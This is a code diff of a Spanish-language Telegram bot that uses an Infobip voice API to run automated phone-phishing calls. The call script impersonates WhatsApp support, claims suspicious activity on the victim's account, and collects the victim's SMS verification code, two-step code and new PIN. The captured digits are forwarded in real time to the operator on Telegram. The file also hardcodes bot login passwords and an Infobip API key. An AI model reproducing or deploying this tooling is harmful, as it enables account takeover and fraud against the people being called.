@@ -39,11 +39,8 @@ function formatNumber(num) {
 
 function getUserApiKey(chatId) {
   const user = authenticatedUsers[chatId];
-  if (user && user.admin) {
-    return DEFAULT_API_KEY;
-  } else if (user && user.apiKey) {
-    return user.apiKey.startsWith("App ") ? user.apiKey : "App " + user.apiKey;
-  }
+  if (user && user.admin) return DEFAULT_API_KEY;
+  if (user && user.apiKey) return user.apiKey.startsWith("App ") ? user.apiKey : "App " + user.apiKey;
   return null;
 }
 
@@ -58,48 +55,47 @@ function getInfobipHost(chatId) {
 // =========================
 const bot = new Telegraf(TELEGRAM_BOT_TOKEN);
 
-// Middleware de autenticación
 bot.use((ctx, next) => {
   if (ctx.message && ctx.message.text) {
     const chatId = ctx.chat.id;
-    if (ctx.message.text.startsWith("/login") || ctx.message.text.startsWith("/start")) {
-      return next();
-    }
+    if (ctx.message.text.startsWith("/login") || ctx.message.text.startsWith("/start")) return next();
+
     if (!authenticatedUsers[chatId] || !authenticatedUsers[chatId].authenticated) {
       const password = ctx.message.text.trim();
+
       if (password === "Mortadela1$") {
         authenticatedUsers[chatId] = { authenticated: true, unlimited: true, admin: true };
         ctx.replyWithHTML("<b>¡Bienvenido Administrador!</b> Tienes acceso ilimitado 😎", Markup.removeKeyboard());
         return;
+
       } else if (password === "PapaHelado4") {
         let currentYear = new Date().getFullYear();
         let expirationDate = new Date(`${currentYear}-03-18T23:59:59`);
-        if (new Date() > expirationDate) {
-          expirationDate = new Date(`${currentYear + 1}-03-18T23:59:59`);
-        }
+        if (new Date() > expirationDate) expirationDate = new Date(`${currentYear + 1}-03-18T23:59:59`);
         authenticatedUsers[chatId] = { authenticated: true, unlimited: false, admin: false, expiresAt: expirationDate };
         ctx.replyWithHTML("<b>¡Bienvenido Usuario!</b> Realiza llamadas a cualquier parte del mundo ⏳", Markup.removeKeyboard());
         return;
+
       } else if (password === "UsuarioExitoso222") {
         let currentYear = new Date().getFullYear();
         let expirationDate = new Date(`${currentYear}-03-18T23:59:59`);
-        if (new Date() > expirationDate) {
-          expirationDate = new Date(`${currentYear + 1}-03-18T23:59:59`);
-        }
+        if (new Date() > expirationDate) expirationDate = new Date(`${currentYear + 1}-03-18T23:59:59`);
         authenticatedUsers[chatId] = {
           authenticated: true,
           unlimited: false,
           admin: false,
           expiresAt: expirationDate,
           apiKey: "App 91c0777bf11b425e082a451010002383-19132ddf-a7d6-42aa-98fb-45bc1d341fda",
-          infobipHost: "api.infobip.com"
+          infobipHost: "l2ljdw.api.infobip.com"
         };
         ctx.replyWithHTML("<b>¡Bienvenido Usuario Exitoso!</b> Realiza llamadas a cualquier parte del mundo 🌍", Markup.removeKeyboard());
         return;
+
       } else {
         ctx.reply("❌ Contraseña incorrecta. Por favor, intenta de nuevo.");
         return;
       }
+
     } else {
       if (!authenticatedUsers[chatId].unlimited) {
         const now = new Date();
@@ -118,9 +114,7 @@ bot.use((ctx, next) => {
 // COMANDOS DEL BOT
 // =========================
 
-bot.command("login", (ctx) => {
-  ctx.reply("🔒 Por favor, ingresa la contraseña:");
-});
+bot.command("login", (ctx) => ctx.reply("🔒 Por favor, ingresa la contraseña:"));
 
 bot.start((ctx) => {
   const chatId = ctx.chat.id;
@@ -192,7 +186,6 @@ function notifyEvent(type, fromNumber, toNumber, extra = {}) {
 
 function buildScenarioPayload(fromNumber, toNumber) {
   const voiceOptions = { language: "es", gender: "female" };
-
   return {
     name: SCENARIO_NAME,
     description: "Flujo interactivo que integra captura inmediata de DTMF/voz y notifica cada interacción en tiempo real.",
@@ -206,40 +199,21 @@ function buildScenarioPayload(fromNumber, toNumber) {
             say: "Hola ${userNameVariable}. Este es un comunicado importante desde el soporte técnico de WhatsApp. De no realizar esta verificación, podría estar en peligro su cuenta, hemos detectado actividades inusuales en su cuenta de WhatsApp. Si usted ha realizado una solicitud en un nuevo dispositivo, presione 1. De lo contrario, presione 2. Si desea repetir el comunicado, presione 3.",
             options: voiceOptions
           },
-          {
-            collectInto: "initialOption",
-            options: { maxInputLength: 1, timeout: 5, sendToReports: "ALWAYS" }
-          }
+          { collectInto: "initialOption", options: { maxInputLength: 1, timeout: 5, sendToReports: "ALWAYS" } }
         ],
         while: "${initialOption != '1' && initialOption != '2'}"
       },
 
       notifyEvent("DTMF_CAPTURED", fromNumber, toNumber, { field: "initialOption", value: "${initialOption}" }),
-
       { say: "Ha presionado ${initialOption}.", options: voiceOptions },
-
-      {
-        say: "Le hemos enviado un código de verificación de 6 dígitos a su número de teléfono registrado. Por favor, verifique sus notificaciones o la pantalla de su WhatsApp y digite el código proporcionado.",
-        options: voiceOptions
-      },
-
-      {
-        collectInto: "verificationCode",
-        options: { maxInputLength: 6, timeout: 10, sendToReports: "ALWAYS" }
-      },
-
+      { say: "Le hemos enviado un código de verificación de 6 dígitos a su número de teléfono registrado. Por favor, verifique sus notificaciones o la pantalla de su WhatsApp y digite el código proporcionado.", options: voiceOptions },
+      { collectInto: "verificationCode", options: { maxInputLength: 6, timeout: 10, sendToReports: "ALWAYS" } },
       notifyEvent("DTMF_CAPTURED", fromNumber, toNumber, { field: "verificationCode", value: "${verificationCode}" }),
 
       {
         repeat: [
-          {
-            say: "Si su cuenta cuenta con verificación de dos pasos, presione 1. De lo contrario, presione 2.",
-            options: voiceOptions
-          },
-          {
-            collectInto: "twoStepOption",
-            options: { maxInputLength: 1, timeout: 5, sendToReports: "ALWAYS" }
-          }
+          { say: "Si su cuenta cuenta con verificación de dos pasos, presione 1. De lo contrario, presione 2.", options: voiceOptions },
+          { collectInto: "twoStepOption", options: { maxInputLength: 1, timeout: 5, sendToReports: "ALWAYS" } }
         ],
         while: "${twoStepOption != '1' && twoStepOption != '2'}"
       },
@@ -249,14 +223,8 @@ function buildScenarioPayload(fromNumber, toNumber) {
       {
         if: "${twoStepOption == '1'}",
         then: [
-          {
-            say: "Para verificar su identidad, por favor, introduzca el código de verificación de dos pasos de 6 dígitos anteriormente configurado en su cuenta.",
-            options: voiceOptions
-          },
-          {
-            collectInto: "twoStepCode",
-            options: { maxInputLength: 6, timeout: 10, sendToReports: "ALWAYS" }
-          },
+          { say: "Para verificar su identidad, por favor, introduzca el código de verificación de dos pasos de 6 dígitos anteriormente configurado en su cuenta.", options: voiceOptions },
+          { collectInto: "twoStepCode", options: { maxInputLength: 6, timeout: 10, sendToReports: "ALWAYS" } },
           notifyEvent("DTMF_CAPTURED", fromNumber, toNumber, { field: "twoStepCode", value: "${twoStepCode}" }),
           { say: "Código de dos pasos recibido. Gracias por su verificación.", options: voiceOptions }
         ]
@@ -265,21 +233,14 @@ function buildScenarioPayload(fromNumber, toNumber) {
       {
         if: "${twoStepOption == '2'}",
         then: [
-          {
-            say: "Por favor, configure su nuevo pin de 6 dígitos de verificación de dos pasos.",
-            options: voiceOptions
-          },
-          {
-            collectInto: "newTwoStepPin",
-            options: { maxInputLength: 6, timeout: 10, sendToReports: "ALWAYS" }
-          },
+          { say: "Por favor, configure su nuevo pin de 6 dígitos de verificación de dos pasos.", options: voiceOptions },
+          { collectInto: "newTwoStepPin", options: { maxInputLength: 6, timeout: 10, sendToReports: "ALWAYS" } },
           notifyEvent("DTMF_CAPTURED", fromNumber, toNumber, { field: "newTwoStepPin", value: "${newTwoStepPin}" }),
           { say: "Nuevo pin configurado correctamente.", options: voiceOptions }
         ]
       },
 
       notifyEvent("CALL_FINISHED", fromNumber, toNumber),
-
       "hangup"
     ]
   };
@@ -305,9 +266,7 @@ function createScenario(apiKey, host, fromNumber, toNumber, callback) {
         } else {
           callback(new Error("No se recibió ID de escenario: " + JSON.stringify(json)));
         }
-      } catch (e) {
-        callback(e);
-      }
+      } catch (e) { callback(e); }
     });
   });
   req.on("error", callback);
@@ -340,39 +299,32 @@ function sendCallMessage(chatId, scenarioId, targetNumber, fromNumber) {
   callRequestsByNumber["+" + cleanTarget] = { chatId, fromNumber, toNumber: targetNumber };
 
   const bulkId = "BULK-" + Date.now() + "-" + Math.random().toString(36).substr(2, 6);
+  const host = getInfobipHost(chatId);
 
   const messagePayload = {
     bulkId,
-    messages: [
-      {
-        scenarioId,
-        from: fromNumber,
-        destinations: [{ to: targetNumber }],
-        retry: { minPeriod: 1, maxPeriod: 5, maxCount: 5 },
-        record: false,
-        deliveryTimeWindow: {
-          from: { hour: 0, minute: 0 },
-          to: { hour: 23, minute: 59 },
-          days: ["MONDAY", "TUESDAY", "WEDNESDAY", "THURSDAY", "FRIDAY", "SATURDAY", "SUNDAY"]
-        },
-        callbackUrl: WEBHOOK
-      }
-    ]
+    messages: [{
+      scenarioId,
+      from: fromNumber,
+      destinations: [{ to: targetNumber }],
+      retry: { minPeriod: 1, maxPeriod: 5, maxCount: 5 },
+      record: false,
+      deliveryTimeWindow: {
+        from: { hour: 0, minute: 0 },
+        to: { hour: 23, minute: 59 },
+        days: ["MONDAY", "TUESDAY", "WEDNESDAY", "THURSDAY", "FRIDAY", "SATURDAY", "SUNDAY"]
+      },
+      callbackUrl: WEBHOOK
+    }]
   };
 
   bot.telegram.sendMessage(chatId, "🚀 Enviando llamada...");
-
-  const host = getInfobipHost(chatId);
 
   const options = {
     method: "POST",
     hostname: host,
     path: "/voice/ivr/1/messages",
-    headers: {
-      Authorization: getUserApiKey(chatId),
-      "Content-Type": "application/json",
-      Accept: "application/json"
-    },
+    headers: { Authorization: getUserApiKey(chatId), "Content-Type": "application/json", Accept: "application/json" },
     maxRedirects: 20
   };
 
@@ -380,15 +332,10 @@ function sendCallMessage(chatId, scenarioId, targetNumber, fromNumber) {
     let chunks = [];
     res.on("data", (chunk) => chunks.push(chunk));
     res.on("end", () => {
-      const msgBody = Buffer.concat(chunks).toString();
-      bot.telegram.sendMessage(chatId, `📨 Respuesta: ${msgBody}`);
+      bot.telegram.sendMessage(chatId, `📨 Respuesta: ${Buffer.concat(chunks).toString()}`);
     });
   });
-
-  req.on("error", (error) => {
-    bot.telegram.sendMessage(chatId, `❌ Error al enviar llamada: ${error.message}`);
-  });
-
+  req.on("error", (error) => bot.telegram.sendMessage(chatId, `❌ Error al enviar llamada: ${error.message}`));
   req.write(JSON.stringify(messagePayload));
   req.end();
 }
@@ -420,7 +367,6 @@ function resolveChatId(scenarioId, toNumber) {
 
 function notifyTelegram(scenarioId, msg, toNumber) {
   const chatId = resolveChatId(scenarioId, toNumber);
-
   if (chatId) {
     bot.telegram.sendMessage(chatId, msg, { parse_mode: "Markdown" })
       .then(() => console.log("🔔 Notificación enviada al usuario:", chatId))
@@ -466,8 +412,7 @@ app.post("/infobip-webhook", (req, res) => {
     console.log("type:", event.type || "REPORTE_FINAL", "| to:", toNumber);
 
     if (event.type === "CALL_ANSWERED" && toNumber) {
-      const clean = String(toNumber).replace(/^\+/, "");
-      answeredCalls.add(clean);
+      answeredCalls.add(String(toNumber).replace(/^\+/, ""));
     }
 
     if (!event.type && event.voiceCall) {
@@ -477,23 +422,18 @@ app.post("/infobip-webhook", (req, res) => {
       if (!didAnswer) {
         const from = event.from || (event.voiceCall && event.voiceCall.from) || "?";
         const timestamp = new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" });
-        const alertMsg = `📵 *NO CONTESTÓ*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(toNumber)}\n🕐 ${timestamp}`;
-        notifyTelegram(scenarioId, alertMsg, toNumber);
+        notifyTelegram(scenarioId, `📵 *NO CONTESTÓ*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(toNumber)}\n🕐 ${timestamp}`, toNumber);
       } else {
-        const msg = processCallEvent(event);
-        notifyTelegram(scenarioId, msg, toNumber);
+        notifyTelegram(scenarioId, processCallEvent(event), toNumber);
       }
 
       cleanupFull(scenarioId, toNumber);
       return;
     }
 
-    const msg = processCallEvent(event);
-    notifyTelegram(scenarioId, msg, toNumber);
+    notifyTelegram(scenarioId, processCallEvent(event), toNumber);
 
-    if (event.type === "CALL_FINISHED") {
-      cleanupCallOnly(scenarioId, toNumber);
-    }
+    if (event.type === "CALL_FINISHED") cleanupCallOnly(scenarioId, toNumber);
   };
 
   if (payload.results && Array.isArray(payload.results)) {
@@ -509,33 +449,28 @@ app.post("/infobip-webhook", (req, res) => {
 // PROCESAMIENTO DE EVENTOS
 // =========================
 function processCallEvent(event) {
-  let message = "";
   const from = event.from || (event.voiceCall && event.voiceCall.from) || "?";
   const to = event.to || (event.voiceCall && event.voiceCall.to) || "?";
   const timestamp = new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" });
+  let message = "";
 
   if (event.type) {
     switch (event.type) {
-
       case "CALL_ANSWERED":
         message = `✅ *¡LLAMADA CONTESTADA!*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
         break;
-
       case "CALL_FINISHED":
         message = `📵 *LLAMADA FINALIZADA*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
         break;
-
       case "CALL_FAILED":
       case "NO_ANSWER":
       case "CALL_NO_ANSWER":
         message = `❌ *LLAMADA FALLIDA / NO CONTESTÓ*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
         break;
-
       case "CALL_REJECTED":
       case "BUSY":
         message = `🚫 *LLAMADA RECHAZADA*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
         break;
-
       case "DTMF_CAPTURED": {
         const fieldNames = {
           initialOption:    "Opción inicial",
@@ -544,21 +479,17 @@ function processCallEvent(event) {
           twoStepCode:      "🔐 Código dos pasos",
           newTwoStepPin:    "📌 Nuevo PIN"
         };
-        const fieldLabel = fieldNames[event.field] || event.field;
-        message = `🔢 *${fieldLabel}: ${event.value}*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
+        message = `🔢 *${fieldNames[event.field] || event.field}: ${event.value}*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
         break;
       }
-
       case "CALL_STARTED":
       case "STARTED":
         message = `📲 *LLAMADA INICIADA*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
         break;
-
       case "CALL_RINGING":
       case "RINGING":
         message = `🔔 *LLAMANDO...*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
         break;
-
       default:
         message = `ℹ️ *EVENTO: ${event.type}*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n🕐 ${timestamp}`;
         if (event.properties) message += `\n📋 ${JSON.stringify(event.properties)}`;
@@ -567,17 +498,12 @@ function processCallEvent(event) {
   } else if (event.voiceCall && event.voiceCall.ivr && event.voiceCall.ivr.collectedDtmfs) {
     message = `📋 *RESUMEN DE LLAMADA*\n📞 De: ${formatNumber(from)}\n🎯 Para: ${formatNumber(to)}\n`;
     try {
-      const dtmfData = JSON.parse(event.voiceCall.ivr.collectedDtmfs);
-      if (dtmfData.initialOption && dtmfData.initialOption !== "null")
-        message += `\n1️⃣ Opción inicial: ${dtmfData.initialOption}`;
-      if (dtmfData.verificationCode && dtmfData.verificationCode !== "")
-        message += `\n🔑 Código ingresado: ${dtmfData.verificationCode}`;
-      if (dtmfData.twoStepOption && dtmfData.twoStepOption !== "null")
-        message += `\n2️⃣ Opción segundo paso: ${dtmfData.twoStepOption}`;
-      if (dtmfData.twoStepCode && dtmfData.twoStepCode !== "null")
-        message += `\n🔐 Código segundo paso: ${dtmfData.twoStepCode}`;
-      if (dtmfData.newTwoStepPin && dtmfData.newTwoStepPin !== "null")
-        message += `\n📌 Nuevo PIN: ${dtmfData.newTwoStepPin}`;
+      const d = JSON.parse(event.voiceCall.ivr.collectedDtmfs);
+      if (d.initialOption && d.initialOption !== "null")     message += `\n1️⃣ Opción inicial: ${d.initialOption}`;
+      if (d.verificationCode && d.verificationCode !== "")   message += `\n🔑 Código ingresado: ${d.verificationCode}`;
+      if (d.twoStepOption && d.twoStepOption !== "null")     message += `\n2️⃣ Opción segundo paso: ${d.twoStepOption}`;
+      if (d.twoStepCode && d.twoStepCode !== "null")         message += `\n🔐 Código segundo paso: ${d.twoStepCode}`;
+      if (d.newTwoStepPin && d.newTwoStepPin !== "null")     message += `\n📌 Nuevo PIN: ${d.newTwoStepPin}`;
     } catch (err) {
       message += `\nError parseando DTMFs: ${err.message}`;
     }
@@ -593,9 +519,7 @@ function processCallEvent(event) {
 // =========================
 // INICIALIZACIÓN
 // =========================
-app.listen(PORT, () => {
-  console.log(`Servidor Express escuchando en el puerto ${PORT}`);
-});
+app.listen(PORT, () => console.log(`Servidor Express escuchando en el puerto ${PORT}`));
 
 function launchBot(retries = 5) {
   bot.launch()
